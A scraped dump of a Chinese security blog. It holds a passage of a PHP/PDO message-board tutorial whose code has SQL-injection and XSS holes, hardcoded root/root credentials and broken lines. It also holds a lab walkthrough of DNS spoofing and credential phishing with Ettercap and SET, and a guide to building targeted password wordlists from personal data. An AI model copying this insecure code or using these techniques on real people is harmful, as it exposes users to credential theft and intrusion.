type=&quot;text&quot; name=&quot;userName&quot;&gt; &lt;br&gt; &lt;br&gt; 密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.4发布留言页面123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;发送留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select Name from user where Name!=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); ?&gt; &lt;h1&gt;留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;br&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;form action=&quot;send_message.php&quot; method=&quot;POST&quot;&gt; 接收人: &lt;select name=&quot;receiver&quot;&gt; &lt;option value=&quot;all&quot;&gt;所有人&lt;/option&gt; &lt;?php while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $name=$result[&apos;Name&apos;]; echo &quot;&lt;option value=&apos;$name&apos;&gt;&quot;.$name.&quot;&lt;/option&gt;&quot;; &#125; ?&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; &lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.5注册页面12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板注册&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板注册&lt;/h1&gt; &lt;form action=&quot;signup.php&quot; method=&quot;POST&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;userName&quot;&gt; &lt;br&gt; &lt;br&gt; 昵&amp;nbsp;&amp;nbsp;&amp;nbsp;称：&lt;input type=&quot;text&quot; name=&quot;Name&quot;&gt; &lt;br&gt; &lt;br&gt; 密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.6修改留言页面1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;]; $message_ID=$_GET[&apos;id&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;编辑留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select Name from user where Name!=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); ?&gt; &lt;h1&gt;编辑留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;form action=&quot;update_message.php&quot; method=&quot;POST&quot;&gt; 接收人: &lt;select name=&quot;receiver&quot;&gt; &lt;option value=&quot;all&quot;&gt;所有人&lt;/option&gt; &lt;?php while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $name=$result[&apos;Name&apos;]; echo &quot;&lt;option value=&apos;$name&apos;&gt;&quot;.$name.&quot;&lt;/option&gt;&quot;; &#125; ?&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; &lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;hidden&quot; name=&quot;ID&quot; value=&quot;&lt;?php echo $message_ID; ?&gt;&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/body&gt;&lt;/html&gt; 5.PDOPDO是 PHP Date Object （PHP数据对象）的简称，目前支持的数据库包括Firebird， FreeTDS，Interbase ，MySQL，MS SQL Server， ODBC, Oracle，Postgre SQL，SQLite 以及 Sybase等。有了PDO，用户就不必再使用 mysql_*函数，aco_函数或者 mssql_\\函数，也不必再将他们封装到数据库操作类，只需要使用PDO接口中的方法就可以对不同的数据库进行操作，在选择不同数据库时，只需要修改PDO的 DNS（数据库名）就可以了。 5.1PDO构造函数连接数据库PDO构造函数的形式： 1_construct(string $dsn[,string $username[,string $password[,array $driver_options]]]) $dsn：主机IP地址及数据库名称 1$dsn=\"mysql:host=$host;dbName=$dbName\" $username：数据库用户名$password：数据库密码$driver_options：连接数据库的其他选项 通过PDO连接数据库 12345678910111213&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); echo \"Connect successed.\"; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2使用PDO执行SQL语句在PDO中，可以使用3中方式执行SQL语句，分别是exec()方法，query方法，以及预处理语句prepare()和execute()方法 5.2.1PDO::exec()方法exec()方法形式如下： 1int PDO::exec(string $statement) PDO::exec()执行一条SQL语句，并返回受影响的行数。$statement是要执行的SQL语句。 通过exec()方法执行SQL语句 123456789101112131415&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;exec($query); echo \"数据插入成功,受影响行数为：\".$result; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2.2PDO::query()方法query()方法形式如下： 1PDOStatement PDO::query(string $statement) PDO::query()可执行多条SQL语句，并以PDOStatement对象形式返回结果集。 通过PDO::query()执行SQL语句 123456789101112131415&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;query($query); print_r($result); &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2.3预处理语句：PDO::prepare()语句和execute()语句PDO::prepare()方法形式如下： 1PDOStatement PDO::prepare(string $statement[,array $driver_options]) PDOStatement::execute方法形式如下： 1bool PDOStatement::execute([array $input_parameters]) PDO::prepare()方法为PDOStatement::execute()方法准备待执行的SQL语句。SQL 语句可以包含零个或多个参数占位标记，格式是命名（:name）或问号（?）的形式，当它执行时将用真实数据取代。 在同一个 SQL 语句里，命名形式和问号形式不能同时使用；只能选择其中一种参数形式。PDOStatement::execute()方法执行一条预处理语句。 使用预处理语句执行SQL语句： 123456789101112131415161718&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;prepare($query); $res-&gt;execute(); while($result=$result-&gt;fetch(PDO::FETCH_ASSOC))&#123; echo $result['userName'].$result['Password'].$result[Name]; &#125; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.3PDOStatement::fetch5.3.1PDOStatement::fetchPDOStatement::fetch形式如下： 1mixed PDOStatement::fetch ([ int $fetch_style [, int $cursor_orientation = PDO::FETCH_ORI_NEXT [, int $cursor_offset = 0 ]]] ) 5.3.1.1参数-$fetch_style控制下一行如何返回给调用者。此值必须是 PDO::FETCH_* 系列常量中的一个，缺省为 PDO::ATTR_DEFAULT_FETCH_MODE的值 （默认为 PDO::FETCH_BOTH）。 参数 效果 PDO::FETCH_ASSOC 返回一个索引为结果集列名的数组 PDO::FETCH_BOTH（默认） 返回一个索引为结果集列名和以0开始的列号的数组 PDO::FETCH_BOUND 返回 TRUE ，并分配结果集中的列值给 PDOStatement::bindColumn() 方法绑定的 PHP 变量。 PDO::FETCH_CLASS 返回一个请求类的新实例，映射结果集中的列名到类中对应的属性名。如果 fetch_style 包含 PDO::FETCH_CLASSTYPE（例如：PDO::FETCH_CLASS PDO::FETCH_INTO 更新一个被请求类已存在的实例，映射结果集中的列到类中命名的属性 PDO::FETCH_LAZY 结合使用 PDO::FETCH_BOTH 和 PDO::FETCH_OBJ，创建供用来访问的对象变量名 PDO::FETCH_NUM 返回一个索引为以0开始的结果集列号的数组 PDO::FETCH_OBJ 返回一个属性名对应结果集列名的匿名对象 5.3.1.2参数-$cursor_orientation对于 一个 PDOStatement 对象表示的可滚动游标，该值决定了哪一行将被返回给调用者。此值必须是 PDO::FETCH_ORI_* 系列常量中的一个，默认为 PDO::FETCH_ORI_NEXT。要想让 PDOStatement 对象使用可滚动游标，必须在用 PDO::prepare() 预处理SQL语句时，设置 PDO::ATTR_CURSOR 属性为 PDO::CURSOR_SCROLL。 5.3.1.3参数-$offset对于一个 cursor_orientation 参数设置为 PDO::FETCH_ORI_ABS 的PDOStatement 对象代表的可滚动游标，此值指定结果集中想要获取行的绝对行号。 对于一个 cursor_orientation 参数设置为 PDO::FETCH_ORI_REL 的PDOStatement 对象代表的可滚动游标，此值指定想要获取行相对于调用 PDOStatement::fetch() 前游标的位置 5.3.2PDOStatement::fetchAllPDOStatement::fetchAll形式如下 1array PDOStatement::fetchAll ([ int $fetch_style [, mixed $fetch_argument [, array $ctor_args = array() ]]] ) 5.3.2.1参数-$fetch_style控制返回数组的内容如同 PDOStatement::fetch() 文档中记载的一样。默认为 PDO::ATTR_DEFAULT_FETCH_MODE 的值（ 其缺省值为 PDO::FETCH_BOTH ） 想要返回一个包含结果集中单独一列所有值的数组，需要指定 PDO::FETCH_COLUMN 。通过指定 column-index 参数获取想要的列。 想要获取结果集中单独一列的唯一值，需要将 PDO::FETCH_COLUMN 和 PDO::FETCH_UNIQUE 按位或。 想要返回一个根据指定列把值分组后的关联数组，需要将 PDO::FETCH_COLUMN 和 PDO::FETCH_GROUP 按位或。 5.3.2.2参数-$fetch_argument 参数 效果 PDO::FETCH_COLUMN 返回指定以0开始索引的列 PDO::FETCH_CLASS 返回指定类的实例，映射每行的列到类中对应的属性名 PDO::FETCH_FUNC 将每行的列作为参数传递给指定的函数，并返回调用函数后的结果 5.3.2.3参数-$ctor_args当 fetch_style 参数为 PDO::FETCH_CLASS 时，自定义类的构造函数的参数。 5.3.3PDOStatement::fetchColumnPDOStatement::fetchColumn形式如下： 1string PDOStatement::fetchColumn ([ int $column_number = 0 ] ) 5.3.3.1参数-column_number你想从行里取回的列的索引数字（以0开始的索引）。如果没有提供值，则 PDOStatement::fetchColumn() 获取第一列。 5.3.4PDOStatement::fetchObjectPDOStatement::fetchObject形式如下： 1mixed PDOStatement::fetchObject ([ string $class_name = \"stdClass\" [, array $ctor_args ]] ) 5.3.4.1参数-class_name创建类的名称。 5.3.4.2参数-ctor_args此数组的元素被传递给构造函数。 6.缺陷没有考虑防御手段。 7.参考[1] php实现留言板功能 [2] PDO中执行SQL语句的三种方法 [3] PDO中获取结果集之fetch()方法详解 [4] T-SQL教程 [5] PHP Sessions [6] PHP:PDO-Manual","categories":[],"tags":[]},{"title":"'使用Ettercap和SET进行DNS欺骗、钓鱼'","slug":"I-can-not-see-U","date":"2019-03-26T11:51:17.000Z","updated":"2019-03-26T13:48:41.268Z","comments":true,"path":"2019/03/26/I-can-not-see-U/","link":"","permalink":"https://chirec.github.io/2019/03/26/I-can-not-see-U/","excerpt":"1.工具介绍1.1Ettercap Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis. 1.2SET(Socail-Engineering-Toolkit) Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。","text":"1.工具介绍1.1Ettercap Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis. 1.2SET(Socail-Engineering-Toolkit) Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。 2.工具使用2.1Ettercap参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263Usage: ettercap [OPTIONS] [TARGET1] [TARGET2]TARGET is in the format MAC/IP/IPv6/PORTs (see the man for further detail)Sniffing and Attack options: -M, --mitm &lt;METHOD:ARGS&gt; perform a mitm attack -o, --only-mitm don&apos;t sniff, only perform the mitm attack -b, --broadcast sniff packets destined to broadcast -B, --bridge &lt;IFACE&gt; use bridged sniff (needs 2 ifaces) -p, --nopromisc do not put the iface in promisc mode -S, --nosslmitm do not forge SSL certificates -u, --unoffensive do not forward packets -r, --read &lt;file&gt; read data from pcapfile &lt;file&gt; -f, --pcapfilter &lt;string&gt; set the pcap filter &lt;string&gt; -R, --reversed use reversed TARGET matching -t, --proto &lt;proto&gt; sniff only this proto (default is all) --certificate &lt;file&gt; certificate file to use for SSL MiTM --private-key &lt;file&gt; private key file to use for SSL MiTMUser Interface Type: -T, --text use text only GUI -q, --quiet do not display packet contents -s, --script &lt;CMD&gt; issue these commands to the GUI -C, --curses use curses GUI -D, --daemon daemonize ettercap (no GUI) -G, --gtk use GTK+ GUILogging options: -w, --write &lt;file&gt; write sniffed data to pcapfile &lt;file&gt; -L, --log &lt;logfile&gt; log all the traffic to this &lt;logfile&gt; -l, --log-info &lt;logfile&gt; log only passive infos to this &lt;logfile&gt; -m, --log-msg &lt;logfile&gt; log all the messages to this &lt;logfile&gt; -c, --compress use gzip compression on log filesVisualization options: -d, --dns resolves ip addresses into hostnames -V, --visual &lt;format&gt; set the visualization format -e, --regex &lt;regex&gt; visualize only packets matching this regex -E, --ext-headers print extended header for every pck -Q, --superquiet do not display user and passwordLUA options: --lua-script &lt;script1&gt;,[&lt;script2&gt;,...] comma-separted list of LUA scripts --lua-args n1=v1,[n2=v2,...] comma-separated arguments to LUA script(s)General options: -i, --iface &lt;iface&gt; use this network interface -I, --liface show all the network interfaces -Y, --secondary &lt;ifaces&gt; list of secondary network interfaces -n, --netmask &lt;netmask&gt; force this &lt;netmask&gt; on iface -A, --address &lt;address&gt; force this local &lt;address&gt; on iface -P, --plugin &lt;plugin&gt; launch this &lt;plugin&gt; -F, --filter &lt;file&gt; load the filter &lt;file&gt; (content filter) -z, --silent do not perform the initial ARP scan -6, --ip6scan send ICMPv6 probes to discover IPv6 nodes on the link -j, --load-hosts &lt;file&gt; load the hosts list from &lt;file&gt; -k, --save-hosts &lt;file&gt; save the hosts list to &lt;file&gt; -W, --wifi-key &lt;wkey&gt; use this key to decrypt wifi packets (wep or wpa) -a, --config &lt;config&gt; use the alterative config file &lt;config&gt;Standard options: -v, --version prints the version and exit -h, --help this help screen 2.2SET1234561) Social-Engineering Attacks2) Penetration Testing (Fast-Track)3) Third Party Modules4) Update the Social-Engineer Toolkit5) Update SET configuration6) Help, Credits, and About 1234567891011 1) Spear-Phishing Attack Vectors 2) Website Attack Vectors 3) Infectious Media Generator 4) Create a Payload and Listener 5) Mass Mailer Attack 6) Arduino-Based Attack Vector 7) Wireless Access Point Attack Vector 8) QRCode Generator Attack Vector 9) Powershell Attack Vectors10) SMS Spoofing Attack Vector11) Third Party Modules 123456781) Java Applet Attack Method2) Metasploit Browser Exploit Method3) Credential Harvester Attack Method4) Tabnabbing Attack Method5) Web Jacking Attack Method6) Multi-Attack Web Method7) Full Screen Attack Method8) HTA Attack Method 1231) Web Templates2) Site Cloner3) Custom Import 1231. Java Required2. Google3. Twitter 3.实验过程3.1生成钓鱼网页生成钓鱼网页之后，使用Windows7访问，并输入账号密码进行测试，在Kali中获得输入的信息。 3.2DNS欺骗使用Ettercap进行DNS欺骗，这里使用图形化界面，也可以直接在终端输入命令。直接输入命令可以查看参考[1]。 Step 1：Scan for Hosts，然后打开Hosts List Step 2：Add to Target Step 3：Mitm 选择ARP poisoning，勾选Sniff remote connection Step 4：Plugins，选择dns_spoof 3.3钓鱼结果在进行DNS欺骗后，使用Windows7，访问www.jj.com。此时，页面显示的是之前的钓鱼网页。 输入账号密码进行测试。 4.原理DNS欺骗是一种中间人攻击形式，攻击者冒充域名服务器，向主机提供错误DNS信息，当用户尝试浏览网页时，跳转到错误的攻击者的主页。再通过钓鱼网站可以获取用户的关键信息。 5.参考[1] 技术讨论 | 利用SET和Ettercap实现内网钓鱼获取帐号密码 [2] DNS欺骗原理及其防御方案","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'生成社工字典'","slug":"Generate-Social-Engineering-Wordlist","date":"2019-03-25T12:10:41.000Z","updated":"2019-03-25T13:41:44.578Z","comments":true,"path":"2019/03/25/Generate-Social-Engineering-Wordlist/","link":"","permalink":"https://chirec.github.io/2019/03/25/Generate-Social-Engineering-Wordlist/","excerpt":"1.工具介绍两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。 1.1pydictory 你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作； 你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系； 1.2cupper cupper可以实现的功能如下： 根据目标的信息，生成目标可能使用的密码列表（核心功能） 对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率 下载作者提供的常用密码字典","text":"1.工具介绍两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。 1.1pydictory 你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作； 你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系； 1.2cupper cupper可以实现的功能如下： 根据目标的信息，生成目标可能使用的密码列表（核心功能） 对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率 下载作者提供的常用密码字典 2.工具下载2.1pydictor1git clone https://github.com/LandGrey/pydictor.git 2.2cupper1git clone https://github.com/ChireC/cupper.git 3.工具使用3.1pydictor3.1.1参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263optional arguments: -h, --help show this help message and exit -base Type Choose from (d, L, c, dL, dc, Lc, dLc) d digital [0 - 9] L lowercase letters [a - z] c capital letters [A - Z] dL Mix d and L [0-9 a-z] dc Mix d and c [0-9 A-Z] Lc Mix L and c [a-z A-Z] dLc Mix d, L and dL [0-9 a-z A-Z] -char character 使用自定义字符集生成字典 -chunk arg [arg ...] 使用排列组合生成字典 -extend arg [arg ...] 拓展字典 //插件生成字典 -plug arg [arg ...] 一段时间内生日生成字典 [begin_date] [end_date], date format: [YYYYMMDD] ftp [keyword1] [keyword2] ... 身份证后4位生成字典 chinese id card last 4 digit 身份证后6位生成字典 chinese id card last 6 digit 身份证后8位生成字典 chinese id card last 8 digit 网页原始关键词生成字典 [url_or_file] --conf [file_path] 使用语法引擎解析字典 --sedb 进入社会工程学字典生成界面 -o path, --output path 设置输入文件位置 -tool arg [arg ...] 字典合并 [dir] 字典比较 [minuend_file] [subtrahend_file] 词频统计 [&apos;v&apos;,&apos;s&apos;,&apos;vs&apos;] [file] [view_num] 字典处理 [file] 多字典文件组合 [file1] [file2] ... 安全擦除字典 [file_or_dir] 合并去重 [dir] 字典去重 [file] --len minlen maxlen 设置生成密码长度 Default: min=0 max=4 --head prefix 为密码开头增加字符 --tail suffix 为密码结尾增加字符 //编码格式 --encode encode b16 base16 encode b32 base32 encode b64 base64 encode des des algorithm and need modify code execjs execute js function and need modify code hmac hmac message digest algorithm md5 md5 message digest algorithm output 32 char md516 md5 message digest algorithm output 16 char none default and don&apos;t encode rsa rsa algorithm and need modify code sha1 sha-1 message digest algorithm sha256 sha-256 message digest algorithm sha512 sha-512 message digest algorithm test custom yourself encode method by modifying function //自定义编码方式 url url encode//出现字母和数字设置范围 --occur letter digital special Default: letter &quot;&lt;=99&quot; digital &quot;&lt;=99&quot; special &quot;&lt;=99&quot; --types letter digital special Default: letter &quot;&gt;=0&quot; digital &quot;&gt;=0&quot; special &quot;&gt;=0&quot; --regex regex Filter by regex, Default: (.*?)//正则表达式过滤 --level code Use code [1-5] to filter results, default: 3 //密码等级 --leet code [code ...] Choose leet mode code (0, 1, 2, 11-19, 21-29) 3.1.2生成社工字典 1234567891011121314151617181920python pydictor.py --sedbset cname liweiset sname lw Lweiset ename zwellset birth 19880916set usedpwd liwei123456. liwei@19880916 lw19880916_123set phone 18852006666set uphone 15500998080set hphone 76500100 61599000 01061599000set email 33125500@qq.comset email 13561207878@163.comset email weiweili@gmail.comset email wei010wei@hotmail.comset postcode 663321 962210set nickname zliliset idcard 152726198809160571set jobnum 20051230 100563set otherdate 19591004 19621012set otherdate 19870906 19880208set usedchar tiger gof gamesthrones 176003 m0n5ter ppdog 3.1.3字典分析由目标信息组合成的各种密码，由于这次填写的信息比较多，所以在字典中没有弱口令，在之前的测试中，并没有填写很多目标信息，导致字典中弱口令很多。 3.1.4使用体验在设置对象信息时，如果出现错误，会直接跳出社会工程字典生成模块，并且再次进入模块不会保存上次填写的信息。 3.2cupper3.2.1参数1234567optional arguments: -h, --help show this help message and exit -f FILE, --file FILE 对密码文件进行各种处理 -i, --interactive 交互式生成密码字典 -s, --session 管理保存输入信息的session文件 -d, --download 下载作者维护的密码字典 -v, --version 查看Logo和显示工具版本 3.2.2生成社工字典 3.2.3使用体验因为是交互式界面，所以很舒服，按照提示填写目标信息即可，要求目标信息非常多，非常详细，而且还可以根据目标对密码的了解程度，以及你生成密码的目的添加信息的信息和参数。如果目标很了解密码，还会生成加密后的密码，如果需要目标社交网络上登陆密码，还要求输入目标站点的名称。 4.参考[1] pydictor-GitHub [2] cupper-GitHub","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'使用PHP编写留言板'","slug":"Create-Message-Board-with-PHP","date":"2019-03-24T07:36:54.000Z","updated":"2019-03-24T13:19:08.425Z","comments":true,"path":"2019/03/24/Create-Message-Board-with-PHP/","link":"","permalink":"https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/","excerpt":"PHP留言板结构 1.新建Message类123456789101112131415161718class Message&#123; public $name; public $time; public $content; function __construct($n,$t,$c)&#123; $this-&gt;name=$n; $this-&gt;time=$t; $this-&gt;content=$c; &#125; function show()&#123; echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;; echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;; &#125;&#125; Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。在创建对象时，构造函数使将值赋给对象的3个属性。show()方法则是显示留言内容。 2.新建MessageBoard类","text":"PHP留言板结构 1.新建Message类123456789101112131415161718class Message&#123; public $name; public $time; public $content; function __construct($n,$t,$c)&#123; $this-&gt;name=$n; $this-&gt;time=$t; $this-&gt;content=$c; &#125; function show()&#123; echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;; echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;; &#125;&#125; Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。在创建对象时，构造函数使将值赋给对象的3个属性。show()方法则是显示留言内容。 2.新建MessageBoard类 上图左边是MessageBoard类的结构。MessageBoard类包含1个属性，messages。messages的数据类型是数组，其中存放了所有的留言。MessageBoard类包含5个方法，showForm()、saveData()、loadData()、showAllMessages()、showForm()。这5个方法的具体作用写在下面。 2.1显示页面2.1.1showForm()1234567function showForm()&#123; echo &quot;&lt;form action=&apos; &apos; method=&apos;POST&apos;&gt;&quot;; echo &quot;Name: &quot;.&quot;&lt;input type=&apos;text&apos; name=&apos;userName&apos;&gt;&quot;.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.&quot;&lt;input type=&apos;text&apos; name=&apos;content&apos;&gt;&quot;; echo &quot;&lt;input type=&apos;submit&apos;&gt;&quot;; echo &quot;&lt;/form&gt;&quot;; &#125; showForm()方法用于显示留言板的表单，通过echo输出HTML语句标签显示表单，表单提交的方式为POST。 2.1.2showAllMessages()12345function showAllMessages()&#123; foreach($this-&gt;messages as $m)&#123; $m-&gt;show(); &#125; &#125; showAllMessages()方法用于输出留言内容。上面说过messages的数据类型是数组，所以使用foreach()循环输出数组内容，messages中的元素属于Message类，所以使用自身的方法show()来显示留言内容。 2.2留言的接收和读取2.2.1receiveMessage()12345function receiveMessage()&#123; if (count($_POST)!=0)&#123; $this-&gt;saveData($_POST[&apos;userName&apos;],date(&quot;Y-M-D h:i:s&quot;,time()),$_POST[&apos;content&apos;]); &#125; &#125; receiveMessage()方法用于接收留言，如果收到留言则使用saveData()方法将留言存储起来。 2.2.2saveData()12345function saveData($u,$t,$c)&#123; echo &quot;UserName: &quot;.$u.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$t.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$c.&quot;&lt;br /&gt;&quot;; &#125; 此时的saveData()方法只是用于测试整个留言板是否正常工作，还没有连接数据库，所以无法将数据存储在数据库中。只是将要存储的内容显示在页面上。 2.2.3loadData()123456function loadData()&#123; $temp=new Message(&quot;chessur&quot;,&quot;2019.3.26&quot;,&quot;Hello World!&quot;); array_push($this-&gt;messages,$temp); $temp=new Message(&quot;Andy&quot;,&quot;2019.3.26&quot;,&quot;Hello chessur&quot;); array_push($this-&gt;messages,$temp); &#125; 和saveData()方法一样，此时的loadData()也只是测试阶段。使用$temp存储留言，使用array_push()函数将留言存放在messages数组中。 3.数据库数据库中的数据结构 上图的左边是DB类的结构，database属性和构造函数。具体内容写在下面。上图的右边是数据库中数据表的结构，4个字段：ID、name、time、content，分别表示留言发表顺序、留言者、留言时间、留言内容。 3.1数据库建立&amp;数据表建立使用PHPMyAdmin的图形化界面建立数据库以及数据表 3.1.1数据库建立 3.1.2数据表建立 3.2连接数据库3.2.1创建DB类1234567891011121314151617181920212223242526272829class DB&#123; public $database=null; function __construct()&#123; //connect $dbhost=&quot;localhost&quot;; //127.0.0.1 